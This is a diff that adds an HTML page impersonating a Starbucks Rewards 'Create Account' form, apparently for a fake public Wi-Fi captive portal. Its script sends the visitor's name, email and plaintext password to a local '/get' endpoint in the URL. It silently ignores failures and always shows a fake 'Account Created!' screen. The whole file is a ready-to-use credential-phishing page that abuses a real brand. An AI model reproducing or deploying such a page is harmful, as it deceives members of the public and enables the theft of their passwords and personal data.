@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Create Account — Starbucks</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f2f0eb;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: #00704a;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.10);
+      padding: 40px 36px 32px;
+      max-width: 420px;
+      width: 100%;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #1e3932;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #6b6b6b;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #e8e8e8;
+      margin: 24px 0;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1e3932;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 15px;
+      color: #1a1a1a;
+      outline: none;
+      transition: border-color 0.2s;
+      margin-bottom: 18px;
+      background: #fafafa;
+    }
+
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #00704a;
+      background: #fff;
+    }
+
+    .row {
+      display: flex;
+      gap: 14px;
+    }
+
+    .row > div {
+      flex: 1;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 22px;
+    }
+
+    .checkbox-row input[type="checkbox"] {
+      margin-top: 3px;
+      accent-color: #00704a;
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+      cursor: pointer;
+    }
+
+    .checkbox-row span {
+      font-size: 13px;
+      color: #6b6b6b;
+      line-height: 1.5;
+    }
+
+    .checkbox-row a {
+      color: #00704a;
+      text-decoration: none;
+    }
+
+    .checkbox-row a:hover {
+      text-decoration: underline;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background-color: #00704a;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      letter-spacing: 0.5px;
+      transition: background-color 0.2s;
+    }
+
+    .btn-primary:hover {
+      background-color: #005f3e;
+    }
+
+    .btn-primary:active {
+      background-color: #004d32;
+    }
+
+    .back-link {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #6b6b6b;
+    }
+
+    .back-link a {
+      color: #00704a;
+      text-decoration: none;
+    }
+
+    .back-link a:hover {
+      text-decoration: underline;
+    }
+
+    /* Success screen */
+    .success-screen {
+      display: none;
+      text-align: center;
+    }
+
+    .success-screen.visible {
+      display: block;
+    }
+
+    .form-section.hidden {
+      display: none;
+    }
+
+    .checkmark {
+      width: 64px;
+      height: 64px;
+      background: #00704a;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .checkmark svg {
+      width: 32px;
+      height: 32px;
+      stroke: #fff;
+    }
+
+    .success-screen h2 {
+      font-size: 20px;
+      color: #1e3932;
+      margin-bottom: 10px;
+    }
+
+    .success-screen p {
+      font-size: 14px;
+      color: #6b6b6b;
+      line-height: 1.6;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+      color: #9b9b9b;
+    }
+
+    footer a {
+      color: #9b9b9b;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    .powered-by {
+      font-size: 11px;
+      color: #bbb;
+      margin-top: 8px;
+    }
+
+    .error {
+      border-color: #c0392b !important;
+    }
+  </style>
+</head>
+<body>
+
+  <header></header>
+
+  <div class="container">
+    <div class="card">
+
+      <div class="form-section" id="formSection">
+        <h1>Create Account</h1>
+        <p class="subtitle">Join Starbucks Rewards and start earning today.</p>
+
+        <form action="/get" method="get" id="create-form" onsubmit="return handleCreate(event)">
+          <div class="row">
+            <div>
+              <label for="firstName">First name</label>
+              <input type="text" id="firstName" name="firstName" placeholder="First name" autocomplete="given-name" />
+            </div>
+            <div>
+              <label for="lastName">Last name</label>
+              <input type="text" id="lastName" name="lastName" placeholder="Last name" autocomplete="family-name" />
+            </div>
+          </div>
+
+          <label for="email">Email address</label>
+          <input type="email" id="email" name="email" placeholder="name@example.com" autocomplete="email" />
+
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" placeholder="Create a password" autocomplete="new-password" />
+
+          <label for="confirmPassword">Confirm password</label>
+          <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm your password" autocomplete="new-password" />
+
+          <div class="checkbox-row">
+            <input type="checkbox" id="terms" />
+            <span>
+              I agree to the <a href="#">Terms of Use</a> and
+              <a href="#">Privacy Policy</a> and confirm I am 13 years of age or older.
+            </span>
+          </div>
+
+          <button class="btn-primary" type="submit">Create Account</button>
+        </form>
+
+        <div class="back-link">
+          Already have an account? <a href="Starbucks_Wifi_Login.html">Sign in</a>
+        </div>
+      </div>
+
+      <!-- Success screen -->
+      <div class="success-screen" id="successScreen">
+        <div class="checkmark">
+          <svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2>Account Created!</h2>
+        <p>Welcome to Starbucks Rewards.<br>You can now sign in and connect.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <footer>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Help</a>
+    <div class="powered-by">Powered by Google &amp; Starbucks</div>
+  </footer>
+
+  <script>
+    function handleCreate(event) {
+      event.preventDefault();
+
+      const firstName = document.getElementById('firstName').value.trim();
+      const lastName = document.getElementById('lastName').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      const confirmPassword = document.getElementById('confirmPassword').value;
+      const terms = document.getElementById('terms').checked;
+
+      let valid = true;
+
+      if (!firstName) { document.getElementById('firstName').classList.add('error'); valid = false; }
+      if (!lastName)  { document.getElementById('lastName').classList.add('error');  valid = false; }
+      if (!email)     { document.getElementById('email').classList.add('error');      valid = false; }
+      if (!password)  { document.getElementById('password').classList.add('error');   valid = false; }
+
+      if (password && confirmPassword !== password) {
+        document.getElementById('confirmPassword').classList.add('error');
+        alert('Passwords do not match.');
+        return;
+      }
+
+      if (!terms) {
+        alert('Please agree to the Terms of Use to continue.');
+        return;
+      }
+
+      if (!valid) return;
+
+      const params = new URLSearchParams({ firstName, lastName, email, password });
+      fetch('/get?' + params.toString(), { method: 'GET' }).catch(() => {});
+      showSuccess();
+    }
+
+    function showSuccess() {
+      document.getElementById('formSection').classList.add('hidden');
+      document.getElementById('successScreen').classList.add('visible');
+    }
+
+    ['firstName','lastName','email','password','confirmPassword'].forEach(function(id) {
+      document.getElementById(id).addEventListener('input', function() {
+        this.classList.remove('error');
+      });
+    });
+  </script>
+
+</body>
+</html>
